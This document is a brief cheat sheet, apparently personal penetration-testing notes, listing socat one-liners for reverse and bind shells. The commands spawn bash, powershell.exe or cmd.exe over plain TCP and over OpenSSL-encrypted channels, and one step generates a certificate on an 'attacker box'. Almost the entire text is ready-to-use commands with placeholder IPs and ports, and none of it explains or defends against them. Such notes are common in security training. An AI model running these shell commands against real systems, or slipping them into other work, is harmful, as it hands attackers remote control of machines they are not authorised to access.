...
# Socat
	Rev shell: socat TCP-L:<port> -
	Windows rev shell: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
	Windows Bind: socat TCP-L:<PORT> EXEC:powershell.exe,pipes
	Linux rev shell: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
	Linux Bind: socat TCP-L:<PORT> EXEC:"bash -li"
	Linux Stable reverse: socat TCP-L:<port> FILE:`tty`,raw,echo=0
## Encrypted Shell
	Generate key on attacker box: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
	make .pem: cat shell.key shell.crt > shell.pem
	rev shell: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
	connect: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
	bind: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
